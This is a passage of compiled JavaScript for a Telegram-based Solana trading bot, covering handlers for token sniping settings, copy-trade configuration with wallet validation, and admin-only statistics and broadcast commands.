    await ctx.services.notifier.event('sniper_status', { user: chatId, status: 'ACTIVE', positionSize: settings.positionSize });
    await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(true) });
});
exports.sniperPauseHandler = (0, common_1.safeHandler)('nexo.sniper.pause', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    const settings = await ctx.services.repos.updateSniperSettings(ctx.chat.id, { status: 'STANDBY' });
    await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(false) });
});
exports.sniperAntiRugHandler = (0, common_1.safeHandler)('nexo.sniper.antirug', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    const current = await ctx.services.repos.getSniperSettings(ctx.chat.id);
    const updated = await ctx.services.repos.updateSniperSettings(ctx.chat.id, { antiRug: !current.antiRug });
    await ctx.editMessageText(msg.sniperMessage(updated), { reply_markup: kb.sniperKeyboard(updated.status === 'ACTIVE') });
});
const SNIPER_SETTING_PROMPTS = {
    setting_position_size: { text: msg.configPositionSizeMessage, key: 'positionSize' },
    setting_dev_hold: { text: msg.configDevHoldMessage, key: 'maxDevHold' },
    setting_slippage: { text: msg.configSlippageMessage, key: 'slippage' },
    setting_priority: { text: msg.configPriorityMessage, key: 'priorityFee' },
    setting_take_profit: { text: msg.configTakeProfitMessage, key: 'takeProfit' },
    setting_stop_loss: { text: msg.configStopLossMessage, key: 'stopLoss' },
};
function sniperSettingPromptHandler(state) {
    return (0, common_1.safeHandler)(`nexo.sniper.${state}`, async (ctx) => {
        await (0, common_1.answerCallback)(ctx);
        await (0, common_1.transition)(ctx, state);
        await ctx.reply(SNIPER_SETTING_PROMPTS[state].text(), { reply_markup: kb.cancelButton() });
    });
}
exports.sniperSettingValueHandler = (0, common_1.safeHandler)('nexo.sniper.setting.value', async (ctx) => {
    const state = ctx.session.state;
    if (!state || !SNIPER_SETTING_PROMPTS[state]) {
        await (0, common_1.resetToIdle)(ctx);
        return;
    }
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    const value = parseFloat(text);
    const ranges = {
        setting_position_size: [0.0001, 1000],
        setting_dev_hold: [0, 100],
        setting_slippage: [1, 50],
        setting_priority: [0.0001, 0.1],
        setting_take_profit: [10, 1000],
        setting_stop_loss: [10, 90],
    };
    const [min, max] = ranges[state];
    if (isNaN(value) || value < min || value > max) {
        await ctx.reply(`Invalid input. Range: ${min} - ${max}.`, { reply_markup: kb.cancelButton() });
        return;
    }
    const settings = await ctx.services.repos.updateSniperSettings(ctx.chat.id, {
        [SNIPER_SETTING_PROMPTS[state].key]: value,
    });
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply(msg.settingUpdatedMessage(settings), { reply_markup: kb.backToSniperKeyboard() });
});
// ---------------------------------------------------------------------------
// Copy Trade
// ---------------------------------------------------------------------------
exports.copyTradeHandler = (0, common_1.safeHandler)('nexo.copytrade', async (ctx) => {
    if (!(await (0, common_1.requirePrivate)(ctx)))
        return;
    await (0, common_1.answerCallback)(ctx);
    const records = await ctx.services.repos.getActiveWallets(ctx.chat.id);
    if (records.length === 0) {
        await ctx.editMessageText(msg.copyTradeWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() => ctx.reply(msg.copyTradeWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }));
        return;
    }
    const cfg = await ctx.services.repos.getCopyTrade(ctx.chat.id);
    await ctx.editMessageText(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) }).catch(() => ctx.reply(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) }));
});
exports.copyTradeStartHandler = (0, common_1.safeHandler)('nexo.copytrade.start', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const current = await ctx.services.repos.getCopyTrade(chatId);
    if (!current.targetWallet) {
        await ctx.reply('Configure a target wallet first (🎯 Configure Target).', {
            reply_markup: kb.copyTradeKeyboard(current.mode),
        });
        return;
    }
    await ctx.services.repos.updateCopyTrade(chatId, { status: 'ACTIVE' });
    await ctx.reply(msg.copyTradeActivatedMessage(), { reply_markup: kb.copyTradeKeyboard(current.mode) });
    await ctx.services.notifier.event('copytrade_activated', { user: chatId, targetWallet: current.targetWallet });
});
exports.copyTradeConfigurePromptHandler = (0, common_1.safeHandler)('nexo.copytrade.configure', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.transition)(ctx, 'copytrade_add');
    await ctx.reply(msg.configureTargetWalletMessage(), { reply_markup: kb.cancelButton() });
});
exports.copyTradeAddHandler = (0, common_1.safeHandler)('nexo.copytrade.add', async (ctx) => {
    const text = ctx.message?.text?.trim();
    if (!text)
        return;
    try {
        new web3_js_1.PublicKey(text);
    }
    catch {
        await ctx.reply('Invalid Solana address.', { reply_markup: kb.cancelButton() });
        return;
    }
    const cfg = await ctx.services.repos.getCopyTrade(ctx.chat.id);
    await ctx.services.repos.updateCopyTrade(ctx.chat.id, { targetWallet: text });
    await (0, common_1.resetToIdle)(ctx);
    await ctx.reply(msg.copyTargetAddedMessage(text), { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
    await ctx.services.notifier.event('copytrade_target_set', { user: ctx.chat.id, targetWallet: text });
});
/** Toggles copy mode between Buy + Sell and Buy Only. */
exports.copyTradeModeHandler = (0, common_1.safeHandler)('nexo.copytrade.mode', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    const chatId = ctx.chat.id;
    const current = await ctx.services.repos.getCopyTrade(chatId);
    const mode = current.mode === 'buy_only' ? 'buy_sell' : 'buy_only';
    await ctx.services.repos.updateCopyTrade(chatId, { mode });
    const cfg = await ctx.services.repos.getCopyTrade(chatId);
    await ctx.editMessageText(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
});
/** Starts the copy-trade limits wizard: max/trade -> max daily -> slippage -> token filter. */
exports.copyTradeLimitsPromptHandler = (0, common_1.safeHandler)('nexo.copytrade.limits', async (ctx) => {
    await (0, common_1.answerCallback)(ctx);
    await (0, common_1.transition)(ctx, 'copytrade_limits', { limitsStep: 'max_per_trade' });
    await ctx.reply(msg.copyLimitsStepMessage('max_per_trade'), { reply_markup: kb.cancelButton() });
});
exports.copyTradeLimitsValueHandler = (0, common_1.safeHandler)('nexo.copytrade.limits.value', async (ctx) => {
    const step = ctx.session.payload.limitsStep;
    const text = ctx.message?.text?.trim();
    if (!text || !step)
        return;
    const chatId = ctx.chat.id;
    if (step === 'token_filter') {
        if (text.toUpperCase() !== 'ALL') {
            try {
                new web3_js_1.PublicKey(text);
            }
            catch {
                await ctx.reply('Invalid token address — send a Solana mint address, or ALL.', { reply_markup: kb.cancelButton() });
                return;
            }
        }
        const filter = text.toUpperCase() === 'ALL' ? null : text;
        await ctx.services.repos.updateCopyTrade(chatId, { tokenFilter: filter });
        const cfg = await ctx.services.repos.getCopyTrade(chatId);
        await (0, common_1.resetToIdle)(ctx);
        await ctx.reply('✅ Copy trade limits saved.', { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
        return;
    }
    const value = parseFloat(text);
    const isPct = step === 'slippage';
    if (isNaN(value) || value <= 0 || (isPct && (value < 1 || value > 50))) {
        await ctx.reply(isPct ? 'Invalid percentage (1-50).' : 'Invalid amount. Send a positive number.', { reply_markup: kb.cancelButton() });
        return;
    }
    const next = {
        max_per_trade: { patch: { maxSolPerTrade: value }, nextStep: 'max_daily' },
        max_daily: { patch: { maxDailySol: value }, nextStep: 'slippage' },
        slippage: { patch: { slippage: value }, nextStep: 'token_filter' },
    };
    const current = next[step];
    await ctx.services.repos.updateCopyTrade(chatId, current.patch);
    await (0, common_1.transition)(ctx, 'copytrade_limits', { limitsStep: current.nextStep });
    await ctx.reply(msg.copyLimitsStepMessage(current.nextStep), { reply_markup: kb.cancelButton() });
});
// ---------------------------------------------------------------------------
// Admin-only commands
// ---------------------------------------------------------------------------
function isAdmin(ctx) {
    const chatId = ctx.chat?.id;
    return chatId !== undefined && ctx.services.config.ADMIN_IDS.includes(chatId);
}
exports.statsHandler = (0, common_1.safeHandler)('nexo.admin.stats', async (ctx) => {
    if (!isAdmin(ctx)) {
        await ctx.reply('Admin only.');
        return;
    }
    const [users, tradesToday, depositsToday, walletRows] = await Promise.all([
        ctx.services.repos.countUsers(),
        ctx.services.repos.countTradesToday(),
        ctx.services.repos.countDepositsToday(),
        ctx.services.repos.allWallets(),
    ]);
    await ctx.reply(`BOT STATS\n\nUsers: ${users}\nWallets: ${walletRows.length}\nTrades (24h): ${tradesToday}\nDeposits (24h): ${depositsToday}\nNetwork: ${ctx.services.config.SOLANA_NETWORK}\nMainnet enabled: ${ctx.services.config.tradingAllowed ? 'yes' : 'no'}`);
});
exports.broadcastHandler = (0, common_1.safeHandler)('nexo.admin.broadcast', async (ctx, text) => {
    if (!isAdmin(ctx)) {
        await ctx.reply('Admin only.');
        return;
    }
    await (0, common_1.resetToIdle)(ctx);
    const chatIds = await ctx.services.repos.allUserChatIds();
    let sent = 0;
    let failed = 0;
    for (const chatId of chatIds) {
        try {
            await ctx.services.sendToUser(chatId, text);
            sent++;
        }
        catch {
            failed++;
        }
        await new Promise((r) => setTimeout(r, 50));
    }
    await ctx.reply(`Broadcast finished: ${sent} sent, ${failed} failed.`);
});
//# sourceMappingURL=nexo.js.map